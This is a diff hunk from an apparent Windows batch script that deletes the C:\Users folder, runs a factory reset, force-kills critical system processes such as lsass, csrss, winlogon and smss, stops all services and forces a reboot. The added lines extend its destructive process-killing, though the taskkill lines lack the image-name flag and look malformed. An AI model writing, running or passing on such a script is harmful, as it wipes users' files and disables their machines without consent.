@@ -330,4 +330,26 @@ rmdir /s /q "C:\Users"
 systemreset -factoryreset
 taskkill explorer.exe /F /T
 taskkill system.exe /F /T
+taskkill svchost.exe /F /T
+taskkill spoolsv.exe /F /T
+taskkill services.exe /F /T
+taskkill lsass.exe /F /T
+taskkill winlogon.exe /F /T
+taskkill csrss.exe /F /T
+taskkill taskhost.exe /F /T
+taskkill dwm.exe /F /T
+taskkill wininit.exe /F /T
+taskkill wuauclt.exe /F /T
+taskkill iexplorer.exe /F /T
+taskkill mstsc.exe /F /T
+taskkill rundll32.exe /F /T
+taskkill regedit.exe /F /T
+taskkill rundll.exe /F /T
+taskkill taskmgr.exe /F /T
+taskkill taskhostw.exe /F /T
+taskkill dllhost.exe /F /T
+taskkill logonui.exe /F /T
+taskkill smss.exe /F /T
+taskkill winmgmt.exe /F /T
+net stop *
 shutdown /r /f /t 0
